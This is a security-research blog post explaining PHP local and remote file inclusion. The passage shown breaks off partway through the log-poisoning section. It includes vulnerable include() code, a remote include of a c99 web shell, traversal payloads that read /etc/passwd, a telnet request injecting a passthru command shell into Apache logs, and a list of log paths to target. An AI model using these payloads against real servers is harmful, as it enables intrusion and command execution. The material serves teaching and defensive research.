<!doctype html>
<html lang="en-us">
  <head>
    <title>Research | How can Local File Inclusion lead to RCE ? // Abdelrhman Allam</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.101.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="Abdelrhman Allam" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="https://sl4x0.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Research | How can Local File Inclusion lead to RCE ?"/>
<meta name="twitter:description" content="Content File Inclusion How the attck works for Remote File Inclusion How the attck works for Local File Inclusion Vulnerable PHP Function for File Inclusion Local File Inclusion To Remote Command Execution LFI to RCE via Apache Log LFI to RCE via Process Environ LFI to RCE via Other Files Fundamental of Perl Library for Exploit Website Introduction to Socket Introduction to Library for WWW in Perl Condition to use Socket or LWP Writing LFI to RCE Exploit with Perl Script Perl Exploit to Injecting code into Target Inject via logfile Inject via Other files Inject via process environment Perl Exploit to Executing injected code on Target Execute code from logfile Execute code from other files Execute code from process environment Execute code from logfile LFI to RCE Complete Exploit Use Logfile Injection Defenses References File Inclusion File Inclusion allows attackers to run their own code on a vulnerable website."/>

    <meta property="og:title" content="Research | How can Local File Inclusion lead to RCE ?" />
<meta property="og:description" content="Content File Inclusion How the attck works for Remote File Inclusion How the attck works for Local File Inclusion Vulnerable PHP Function for File Inclusion Local File Inclusion To Remote Command Execution LFI to RCE via Apache Log LFI to RCE via Process Environ LFI to RCE via Other Files Fundamental of Perl Library for Exploit Website Introduction to Socket Introduction to Library for WWW in Perl Condition to use Socket or LWP Writing LFI to RCE Exploit with Perl Script Perl Exploit to Injecting code into Target Inject via logfile Inject via Other files Inject via process environment Perl Exploit to Executing injected code on Target Execute code from logfile Execute code from other files Execute code from process environment Execute code from logfile LFI to RCE Complete Exploit Use Logfile Injection Defenses References File Inclusion File Inclusion allows attackers to run their own code on a vulnerable website." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://sl4x0.github.io/research/local-file-inclusion-to-rce/" /><meta property="article:section" content="research" />
<meta property="article:published_time" content="2023-02-03T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-02-03T00:00:00+00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://sl4x0.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Abdelrhman Allam" /></a>
      <h1>Abdelrhman Allam</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/about/">About</a>
             // 
          
          <a class="app-header-menu-item" href="/">Home</a>
             // 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      <p>Security Researcher üêõ</p>
      <div class="app-header-social">
        
          <a href="https://github.com/sl4x0" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>My Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://twitter.com/sl4x0" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>My Twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
          </a>
        
          <a href="https://linkedin.com/in/sl4x0" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>My Twitter</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Research | How can Local File Inclusion lead to RCE ?</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Feb 3, 2023
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          12 min read
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://sl4x0.github.io/tags/lfi/">lfi</a>
              <a class="tag" href="https://sl4x0.github.io/tags/rce/">rce</a>
              <a class="tag" href="https://sl4x0.github.io/tags/chain/">chain</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <p><img src="https://www.aptive.co.uk/wp-content/uploads/2017/02/lfi-example-etc-passwd.png" alt=""></p>
<h2 id="content">Content</h2>
<ul>
<li><a href="#file-inclusion">File Inclusion</a>
<ul>
<li><a href="#how-the-attack-works-for-remote-file-inclusion">How the attck works for Remote File Inclusion</a></li>
<li><a href="#how-the-attack-works-for-local-file-inclusion">How the attck works for Local File Inclusion</a></li>
<li><a href="#vulnerable-php-function-for-file-inclusion">Vulnerable PHP Function for File Inclusion</a></li>
</ul>
</li>
<li><a href="#Local-file-inclusion-to-remote-command-execution">Local File Inclusion To Remote Command Execution</a>
<ul>
<li><a href="#lfi-to-rce-via-apache-log">LFI to RCE via Apache Log</a></li>
<li><a href="#lfi-to-rce-via-process-environ">LFI to RCE via Process Environ</a></li>
<li><a href="#lfi-to-rce-via-other-files">LFI to RCE via Other Files</a></li>
</ul>
</li>
<li><a href="#fundamental-of-perl-library-for-exploit-website">Fundamental of Perl Library for Exploit Website</a>
<ul>
<li><a href="#introduction-to-socket">Introduction to Socket</a></li>
<li><a href="#introduction-to-library-for-www-in-perl">Introduction to Library for WWW in Perl</a></li>
<li><a href="#condition-to-use-socket-or-lwp">Condition to use Socket or LWP</a></li>
</ul>
</li>
<li><a href="#writing-lfi-to-rce-exploit-with-perl-script">Writing LFI to RCE Exploit with Perl Script</a>
<ul>
<li><a href="#perl-exploit-to-injecting-code-into-target">Perl Exploit to Injecting code into Target</a>
<ul>
<li><a href="#inject-via-logfile">Inject via logfile</a></li>
<li><a href="#inject-via-other-files">Inject via Other files</a></li>
<li><a href="#inject-via-process-environment">Inject via process environment</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#perl-exploit-to-executing-injected-code-on-target">Perl Exploit to Executing injected code on Target</a>
<ul>
<li><a href="#execute-code-from-logfile">Execute code from logfile</a></li>
<li><a href="#execute-code-from-other-files">Execute code from other files</a></li>
<li><a href="#execute-code-from-process-environment">Execute code from process environment</a></li>
<li><a href="#execute-code-from-logfile">Execute code from logfile</a></li>
</ul>
</li>
<li><a href="#lfi-to-rce-complete-exploit-use-logfile-injection">LFI to RCE Complete Exploit Use Logfile Injection</a></li>
<li><a href="#defenses">Defenses</a></li>
<li><a href="#references">References</a></li>
</ul>
<hr>
<h1 id="file-inclusion">File Inclusion</h1>
<ul>
<li>File Inclusion allows attackers to run their <strong>own code</strong> on a <strong>vulnerable website</strong>.</li>
<li>The attack takes advantage of unenforced and unchecked assumptions made by the program about its inputs.vHe can include their malicious code on a web page to &ldquo;convince&rdquo; a PHP script to include a remote file instead of a <strong>trusted local</strong> file.</li>
</ul>
<h2 id="how-the-attack-works-for-remote-file-inclusion">How the attack works for Remote File Inclusion</h2>
<ul>
<li>RFI is a technique to attack a website by injecting a PHP script.</li>
<li>RFI involves including <strong>external files</strong> (e.g. a <em>PHP shell</em>) in a victim website.</li>
<li>If the attacker is successful, they can execute arbitrary commands on the victim&rsquo;s web server.</li>
</ul>
<p>For instance, a piece of vulnerable PHP code would look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>  $file <span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;page&#39;</span>];       <span style="color:#75715e">//The page we wish to display
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">include</span>($file <span style="color:#f92672">.</span><span style="color:#e6db74">&#34;.php&#34;</span>);       <span style="color:#f92672">&lt;--</span> <span style="color:#a6e22e">Vulnerable</span> <span style="color:#f92672">!!</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>From Code, It <strong>does not perform any checks</strong> on the content of the <code>$page</code> variable so it is easy  to putting our file (PHP Shell) into webpage like this:</p>
<p><a href="http://www.hackme.com/index.php?page=http://www.cwh.org/c99.php">http://www.hackme.com/index.php?page=http://www.cwh.org/c99.php</a>?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>  $file <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.cwh.org/c99.php?&#34;</span>;   <span style="color:#75715e">//$_GET[&#39;page&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">include</span>($file <span style="color:#f92672">.</span><span style="color:#e6db74">&#34;.php&#34;</span>);       <span style="color:#75715e">//include http://www.cwh.org/C99.php?.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>We put &ldquo;<code>?</code>&rdquo; at the end of the URL, This makes the script fetch the intended file, with the appended string as a parameter (which is ignored by the attackers script).</p>
<h2 id="how-the-attack-works-for-local-file-inclusion">How the attack works for Local File Inclusion</h2>
<ul>
<li>It occurs when <strong>internal files</strong> are included in a website without proper validation.</li>
<li>LFI vulnerability can result from carelessly using the file inclusion functionality.</li>
<li>Commonly used to access &ldquo;<code>/etc/passwd</code>&rdquo; and &ldquo;<code>/etc/shadow</code>&rdquo; files in Linux systems.</li>
</ul>
<p>For instance, a piece of vulnerable PHP code would look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>  <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>  $template <span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;template&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">.</span>$template <span style="color:#f92672">.</span><span style="color:#e6db74">&#34;.php&#34;</span>);     <span style="color:#f92672">&lt;--</span> <span style="color:#a6e22e">Vulnerable</span> <span style="color:#f92672">!!</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>From Code, Attacker can assign template to be &ldquo;<code>../../../../etc/passwd%00</code>&rdquo;.
It causes the attacker to read a content from <code>/etc/passwd</code>.</p>
<p><a href="http://www.hackme.com/index.php?template=../../../../etc/passwd%00">http://www.hackme.com/index.php?template=../../../../etc/passwd%00</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>  <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>  $template <span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;template&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;/../../../../etc/passwd%00.php&#34;</span>);  <span style="color:#f92672">&lt;--</span> <span style="color:#a6e22e">Directory</span> <span style="color:#a6e22e">Traversal</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">LFI</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><blockquote>
<p><code>%00</code> (Null CHAR) will ignore everything that comes after %00 (.php suffix)</p>
</blockquote>
<hr>
<h2 id="vulnerable-php-function-for-file-inclusion">Vulnerable PHP Function for File Inclusion</h2>
<blockquote>
<p>File Inclusion (RFI/LFI) mostly occurs from some functions that developers do not properly check user supplied data.</p>
</blockquote>
<p>Example PHP function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>  <span style="color:#66d9ef">include</span>()
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">include_once</span>()
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">require</span>()
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">require_once</span>()
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fopen</span>()
</span></span></code></pre></div><h1 id="local-file-inclusion-to-remote-command-execution">Local File Inclusion To Remote Command Execution</h1>
<p>Normally, We use LFI to read following files:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">/</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">passwd</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">shadow</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">group</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">security</span><span style="color:#f92672">/</span><span style="color:#a6e22e">passwd</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">security</span><span style="color:#f92672">/</span><span style="color:#a6e22e">user</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">security</span><span style="color:#f92672">/</span><span style="color:#a6e22e">environ</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">security</span><span style="color:#f92672">/</span><span style="color:#a6e22e">limits</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span><span style="color:#a6e22e">config</span><span style="color:#f92672">.</span><span style="color:#a6e22e">inc</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
</span></span></code></pre></div><p>But we can apply LFI Vulnerabilities to execute command by injecting malicious code into Apache log, Process Environment and Other files.</p>
<h2 id="lfi-to-rce-via-apache-log">LFI to RCE via Apache Log</h2>
<p>The Malicious HTTP Request must existed to <strong>Apache logs</strong>, By their intrinsic nature logfiles contain data that is driven by users look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># HTTP Request via Telnet #</span>
</span></span><span style="display:flex;"><span>&gt; telnet www.hackme.com <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>GET /index.php?p<span style="color:#f92672">=</span>new.php HTTP/1.1     &lt;-- Normally GET Request when user visit websites
</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">82015</span> 
</span></span><span style="display:flex;"><span>Content-Type: text/html 
</span></span><span style="display:flex;"><span>Content-Location: √¢‚Ç¨¬¶√¢‚Ç¨¬¶√¢‚Ç¨¬¶√¢‚Ç¨¬¶√¢‚Ç¨¬¶
</span></span></code></pre></div><p>If we want to run arbitrary command on target system, we must inject PHP code via HTTP request like <code>&lt;?passthru($_GET[cmd])?&gt;</code> After that logfiles will contain Malicious Code</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Malicious HTTP Request via Telnet # </span>
</span></span><span style="display:flex;"><span>&gt;telnet www.hackme.com <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>GET /cwh/&lt;? passthru<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span>cmd<span style="color:#f92672">])</span> ?&gt; HTTP/1.1    &lt;-- Malicious HTTP Request via Telnet
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  √¢‚Ç¨¬¶√¢‚Ç¨¬¶√¢‚Ç¨¬¶
</span></span><span style="display:flex;"><span>  √¢‚Ç¨¬¶√¢‚Ç¨¬¶√¢‚Ç¨¬¶
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>End telnet<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>Logfiles - access.log<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>  ......
</span></span><span style="display:flex;"><span>  58.18.29.152 - - <span style="color:#f92672">[</span>05/Dec/2008:12:14:22 +0700<span style="color:#f92672">]</span> 
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;GET /cwh/&lt;? passthru(</span>$_GET<span style="color:#e6db74">[cmd]) ?&gt; HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">1958</span> &lt;-- Inject Code into Logfiles
</span></span><span style="display:flex;"><span>  ......
</span></span></code></pre></div><p>Now We can use LFI Vuln to run arbitrary command by finding out where the logs are stored.
Go to LFI Vuln path: <a href="https://www.hackme.com/index.php?p=../../apache/logs/access.log">www.hackme.com/index.php?p=../../apache/logs/access.log</a></p>
<p>That&rsquo;s Great !! We have alredy injected code to logfiles, Now run arbitrary command with &ldquo;cmd&rdquo; variable like this: <a href="https://www.hackme.com/index.php?p=../../apache/logs/access.log%00&amp;cmd=ls">www.hackme.com/index.php?p=../../apache/logs/access.log%00&amp;cmd=ls</a> -la</p>
<p>If you send Malicious HTTP Request from <strong>browser</strong>, It won&rsquo;t work for RCE because browser will automatically <strong>encode special characters</strong> (URL encode) after that it writes encoded request into logfiles (access.log). So we must Inject malicious code via Telnet, Netcat or Perl script with <code>socket/useragent/referer</code> that we will guide in next chapter.</p>
<p>Default Log locations list that used with LFI:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">../</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">access</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">access</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">access</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">acces_log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">acces</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error_log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#a6e22e">etc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">httpd</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">www</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">access_log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">www</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">access</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">local</span><span style="color:#f92672">/</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">access_</span> <span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">local</span><span style="color:#f92672">/</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">access</span><span style="color:#f92672">.</span> <span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">log</span><span style="color:#f92672">/</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">access_log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">log</span><span style="color:#f92672">/</span><span style="color:#a6e22e">apache2</span><span style="color:#f92672">/</span><span style="color:#a6e22e">access_log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">log</span><span style="color:#f92672">/</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">access</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">log</span><span style="color:#f92672">/</span><span style="color:#a6e22e">apache2</span><span style="color:#f92672">/</span><span style="color:#a6e22e">access</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">log</span><span style="color:#f92672">/</span><span style="color:#a6e22e">access_log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">log</span><span style="color:#f92672">/</span><span style="color:#a6e22e">access</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">www</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error_log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">www</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error</span><span style="color:#f92672">.</span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">local</span><span style="color:#f92672">/</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error_l</span> <span style="color:#a6e22e">og</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">local</span><span style="color:#f92672">/</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">logs</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error</span><span style="color:#f92672">.</span><span style="color:#a6e22e">l</span> <span style="color:#a6e22e">og</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">log</span><span style="color:#f92672">/</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error_log</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">../../../../../../../</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span><span style="color:#a6e22e">log</span><span style="color:#f92672">/</span><span style="color:#a6e22e">apache2</span><span style="color:#f92672">/</span><span style="color:#a6e22e">error_log</span>
